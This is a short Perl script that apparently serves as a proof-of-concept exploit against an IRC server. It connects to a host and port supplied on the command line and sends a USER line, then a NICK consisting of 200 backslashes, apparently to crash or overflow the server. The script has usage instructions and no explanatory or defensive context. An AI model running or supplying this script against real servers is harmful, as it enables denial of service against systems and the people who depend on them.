#!/usr/bin/perl
use IO::Socket;

        if (@ARGV < 1) {
                usage();
        }

        $ip     = $ARGV[0];
        $port   = $ARGV[1];

        print "[+] Sending request...\n";

        $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-] Connection FAIL ED!\n";
        print $socket "USER AA AA AA :AA\r\n";
        print $socket "NICK ". "\\" x 200 ."\r\n";

        sleep(3);
        close($socket);

        print "[+] Done!\n";


sub usage() {
        print "[-] Usage: <". $0 ."> <host> <port>\n";
        print "[-] Example: ". $0 ." 127.0.0.1 6667\n";
        exit;
}
